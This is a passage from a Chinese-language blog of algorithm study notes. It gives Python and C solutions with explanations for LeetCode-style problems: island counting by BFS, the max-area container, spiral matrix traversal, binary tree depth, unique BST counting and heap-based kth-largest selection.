<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numIslands</span>(<span class="params">self, grid: [[<span class="built_in">str</span>]]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">bfs</span>(<span class="params">grid,i,j</span>):</span></span><br><span class="line">            queue = [[i,j]]</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                [i,j] = queue.pop(<span class="number">0</span>)</span><br><span class="line">                <span class="comment">#可能存在放入队列的重复结点，所以需要再判断</span></span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                    grid[i][j] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">                    <span class="keyword">if</span>((i-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i-<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i-<span class="number">1</span>,j])</span><br><span class="line">                    <span class="keyword">if</span>((i+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid)) <span class="keyword">and</span> grid[i+<span class="number">1</span>][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i+<span class="number">1</span>,j])</span><br><span class="line">                    <span class="keyword">if</span>((j-<span class="number">1</span> &gt;= <span class="number">0</span>) <span class="keyword">and</span> grid[i][j-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i,j-<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span>((j+<span class="number">1</span> &lt; <span class="built_in">len</span>(grid[<span class="number">0</span>])) <span class="keyword">and</span> grid[i][j+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                        queue.append([i,j+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(grid[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">                    bfs(grid,i,j)</span><br><span class="line">                    count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> count</span><br></pre></td></tr></table></div></figure>


        <h2 id="盛最多水的容器"   >
          <a href="#盛最多水的容器" class="heading-link"><i class="fas fa-link"></i></a><a href="#盛最多水的容器" class="headerlink" title="盛最多水的容器"></a>盛最多水的容器</h2>
      <p>贪心算法、双指针</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209141657084.png" alt="image-20220914165747824"></p>
<p>确定两个指针从头尾开始，依次往中间收缩，由于是装水容量由短板决定，所以对于例子<code>container[0:8]</code>组成的容器来说，左指针对应高度小于右指针对应高度，所以右指针如果往左移动，其容量只会减少。那么我们就尝试将左指针往右移动，企图寻找更大的容器。</p>
<p>其证明感觉没见到几个讲的很清楚的。</p>
<p>这里需要明白一点，最大的容器左右边界之外如果还有边界，那么外面的边界的最大值一定比这个最大容器的短板更短，如果更长，那么挪过去之后，肯定容器更大了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxArea</span>(<span class="params">self, height: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        j = <span class="built_in">len</span>(height)-<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; j:</span><br><span class="line">            <span class="keyword">if</span>(height[i] &lt; height[j]):</span><br><span class="line">                res = <span class="built_in">max</span>(res,height[i]*(j-i))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res = <span class="built_in">max</span>(res,height[j] * (j-i))</span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>



<p>([)]</p>

        <h2 id="螺旋矩阵"   >
          <a href="#螺旋矩阵" class="heading-link"><i class="fas fa-link"></i></a><a href="#螺旋矩阵" class="headerlink" title="螺旋矩阵"></a>螺旋矩阵</h2>
      
        <h3 id="自动机"   >
          <a href="#自动机" class="heading-link"><i class="fas fa-link"></i></a><a href="#自动机" class="headerlink" title="自动机"></a>自动机</h3>
      <div class="table-container"><table>
<thead>
<tr>
<th></th>
<th>number</th>
<th>符号##/边界</th>
</tr>
</thead>
<tbody><tr>
<td>right</td>
<td>right</td>
<td>down</td>
</tr>
<tr>
<td>down</td>
<td>down</td>
<td>left</td>
</tr>
<tr>
<td>left</td>
<td>left</td>
<td>up</td>
</tr>
<tr>
<td>up</td>
<td>up</td>
<td>right</td>
</tr>
</tbody></table></div>
<p>由此写出自动机相关代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Automaton</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,matrix</span>):</span></span><br><span class="line">        self.matrix = matrix</span><br><span class="line">        self.state = <span class="string">&#x27;right&#x27;</span></span><br><span class="line">        self.i = <span class="number">0</span></span><br><span class="line">        self.j = -<span class="number">1</span></span><br><span class="line">        self.myList = []</span><br><span class="line">        self.table = &#123;</span><br><span class="line">            <span class="string">&#x27;right&#x27;</span>: [<span class="string">&#x27;right&#x27;</span>, <span class="string">&#x27;down&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;down&#x27;</span>: [<span class="string">&#x27;down&#x27;</span>, <span class="string">&#x27;left&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;left&#x27;</span>: [<span class="string">&#x27;left&#x27;</span>, <span class="string">&#x27;up&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;up&#x27;</span>: [<span class="string">&#x27;up&#x27;</span>, <span class="string">&#x27;right&#x27;</span>],</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_col</span>(<span class="params">self,i,j</span>):</span></span><br><span class="line">        <span class="keyword">if</span>  j &gt;= <span class="built_in">len</span>(self.matrix[<span class="number">0</span>]) <span class="keyword">or</span> (i &gt;= <span class="built_in">len</span>(self.matrix)) <span class="keyword">or</span> (j &lt; <span class="number">0</span>) <span class="keyword">or</span> (i &lt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.matrix[i][j] == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(self.matrix[i][j],<span class="built_in">int</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nextState</span>(<span class="params">self,i,j</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;right&quot;</span>):</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;down&quot;</span>):</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;left&quot;</span>):</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (self.state == <span class="string">&quot;up&quot;</span>):</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">        self.state = self.table[self.state][self.get_col(i,j)]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(self.matrix)*<span class="built_in">len</span>(self.matrix[<span class="number">0</span>])):</span><br><span class="line">            self.nextState(self.i,self.j)</span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;right&quot;</span>):</span><br><span class="line">                self.j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;down&quot;</span>):</span><br><span class="line">                self.i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;left&quot;</span>):</span><br><span class="line">                self.j -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(self.state == <span class="string">&quot;up&quot;</span>):</span><br><span class="line">                self.i -= <span class="number">1</span></span><br><span class="line">            self.myList.append(self.matrix[self.i][self.j])</span><br><span class="line">            self.matrix[self.i][self.j] = <span class="string">&#x27;#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spiralOrder</span>(<span class="params">self, matrix: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        test = Automaton(matrix)</span><br><span class="line">        test.start()</span><br><span class="line">        <span class="keyword">return</span> test.myList</span><br></pre></td></tr></table></div></figure>



<p>另一个方法是获取依照层进行遍历，当遍历完一层之后，去掉外层，然后再遍历。</p>
<p><code>(top,left)、(top,right)、(bottom,left)、(bottom,right)</code>为矩阵边界点，每次遍历完一层之后，对相应的结点数据进行增减。</p>

        <h2 id="二叉树最大深度"   >
          <a href="#二叉树最大深度" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉树最大深度" class="headerlink" title="二叉树最大深度"></a>二叉树最大深度</h2>
      
        <h3 id="深度优先动态规划"   >
          <a href="#深度优先动态规划" class="heading-link"><i class="fas fa-link"></i></a><a href="#深度优先动态规划" class="headerlink" title="深度优先动态规划"></a>深度优先动态规划</h3>
      <p>明确一个公式</p>
<p><code>deepth(root) = max(deepth(root.rigth),deepth(root.left)) + 1</code></p>
<p>即每一个二叉树的深度等于其左子树和右子树中的最大深度再加上根节点，然后其左子树和右子树又可以被当作一个新的二叉树来进行获得其深度，类似动态规划的递归写法。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxDepth</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(root <span class="keyword">is</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(self.maxDepth(root.right),self.maxDepth(root.left)) + <span class="number">1</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="不同的二叉搜索树"   >
          <a href="#不同的二叉搜索树" class="heading-link"><i class="fas fa-link"></i></a><a href="#不同的二叉搜索树" class="headerlink" title="不同的二叉搜索树"></a>不同的二叉搜索树</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209162015127.png" alt="image-20220916201554961"></p>

        <h3 id="动态规划-1"   >
          <a href="#动态规划-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h3>
      <ul>
<li><p>假设G(n)为n个结点的所有二叉搜索树个数</p>
</li>
<li><p>假设f(i)为以i为根节点的所有二叉搜索树个数</p>
</li>
<li><p>那么可以得出</p>
<p><code>G(n)=f(1)+f(2)+f(3)+f(4)+...+f(n)</code></p>
</li>
<li><p>而对于<code>f(i)</code>，有</p>
<p><code>f(i) = G(i-1)*G(n-i)</code></p>
</li>
<li><p>推导得出卡特兰数公式：</p>
<p><code>G(n)=G(0)∗G(n−1)+G(1)∗G(n−2)+...+G(n−1)∗G(0)</code></p>
</li>
<li><p>依据该公式，将每一项的展开</p>
<ul>
<li>G(0) = 1;</li>
<li>G(1) = 1;</li>
<li>G(2) = <code>G(0)∗G(1) + G(1)∗G(0)</code></li>
<li>G(3) = <code>G(0)∗G(2) + G(1) * G(1) + G(2)*G(0)</code></li>
</ul>
</li>
</ul>
<p>依次类推，最开始时需要的元素为G(0)和G(1)可以推导得出其他所有的G(n)，依据卡特兰公式即可得到状态转移方程</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numTrees</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>]*(n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i):</span><br><span class="line">                dp[i] += dp[j]*dp[i-<span class="number">1</span>-j]</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>




        <h2 id="数组中的第K个最大元素"   >
          <a href="#数组中的第K个最大元素" class="heading-link"><i class="fas fa-link"></i></a><a href="#数组中的第K个最大元素" class="headerlink" title="数组中的第K个最大元素"></a>数组中的第K个最大元素</h2>
      
        <h3 id="堆排序"   >
          <a href="#堆排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3>
      
        <h4 id="建堆"   >
          <a href="#建堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#建堆" class="headerlink" title="建堆"></a>建堆</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,&#125;;</span><br></pre></td></tr></table></div></figure>

<p>构建大顶堆，首先依据顺序排列成二叉完全树</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201650690.png" alt="image-20220920165048440"></p>
<p>然后从<code>idx</code>最大的非叶子结点的子树开始，这里就是<code>idx=4</code>，计算方法为一个循环来大概判断</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = heapSize/<span class="number">2</span></span><br></pre></td></tr></table></div></figure>

<p>然后获取取左右子树的根结点，二叉树基本原理</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> leftIdx = i * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> rightIdx = i * <span class="number">2</span> + <span class="number">2</span>;</span><br></pre></td></tr></table></div></figure>

<p>之后进行判断排序，获取最大的进行交换调整，将大的上移，然后将下移的结点作为一个二叉树根节点继续调整，依次循环</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line"><span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">    maxIdx = leftIdx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">    maxIdx = rightIdx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">    <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">    <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">    maxJustHeap(<span class="built_in">array</span>,maxIdx,heapSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>完整代码为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxJustHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> rootIdx,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">        <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,maxIdx,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,i,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,&#125;;</span><br><span class="line">    buildMaxHeap(<span class="built_in">array</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>完整过程为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201659876.png" alt="image-20220920165930745"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201659777.png" alt="image-20220920165959673"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201700284.png" alt="image-20220920170022172"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201700879.png" alt="image-20220920170058770"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201701842.png" alt="image-20220920170115745"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201701841.png" alt="image-20220920170141740"></p>
<p>即可完成最终调整</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202209201703394.png" alt="image-20220920170311277"></p>

        <h3 id="删除"   >
          <a href="#删除" class="heading-link"><i class="fas fa-link"></i></a><a href="#删除" class="headerlink" title="删除"></a>删除</h3>
      <p>之后删除掉<code>K-1</code>个堆顶元素剩下的堆，即可得到第<code>K</code>个大小的元素。但是堆的删除操作也有点复杂，参照<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39642978/article/details/111551332" >(46条消息) 【数据结构】【堆】堆的建立、插入和删除_西西敏的博客-CSDN博客_堆的建立</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>为了将这个节点删除后的空位填补上，首先要将本堆中最后一个元素的值（假设为<code>value</code>）移动到此位置，然后在被删位置处，用此位置当前的值<code>value</code>和此处的父节点、子节点去比较，如果它与父节点的关系破坏了最大（小）堆，则递归调用<code>shiftUp()</code>来修复；如果它与子节点的关系破坏了最大（小）堆，则递归调用<code>shiftDown()</code>来修复。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxJustHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> rootIdx,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> leftIdx = rootIdx * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rightIdx = rootIdx * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> maxIdx = rootIdx;</span><br><span class="line">    <span class="keyword">if</span>( leftIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[leftIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = leftIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( rightIdx &lt; heapSize &amp;&amp; <span class="built_in">array</span>[rightIdx] &gt; <span class="built_in">array</span>[maxIdx])&#123;</span><br><span class="line">        maxIdx = rightIdx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( maxIdx != rootIdx)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = <span class="built_in">array</span>[rootIdx];</span><br><span class="line">        <span class="built_in">array</span>[rootIdx] = <span class="built_in">array</span>[maxIdx];</span><br><span class="line">        <span class="built_in">array</span>[maxIdx] = tmp;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,maxIdx,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buildMaxHeap</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>,<span class="keyword">int</span> heapSize)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = heapSize/<span class="number">2</span> ; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        maxJustHeap(<span class="built_in">array</span>,i,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    buildMaxHeap(nums,numsSize);</span><br><span class="line">    <span class="keyword">int</span> heapSize = numsSize;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; k - <span class="number">1</span> ; i ++)&#123;</span><br><span class="line">        <span class="comment">//int tmp = nums[heapSize-1];</span></span><br><span class="line">        nums[<span class="number">0</span>] = nums[heapSize<span class="number">-1</span>];</span><br><span class="line">        heapSize -= <span class="number">1</span>;</span><br><span class="line">        maxJustHeap(nums,<span class="number">0</span>,heapSize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span 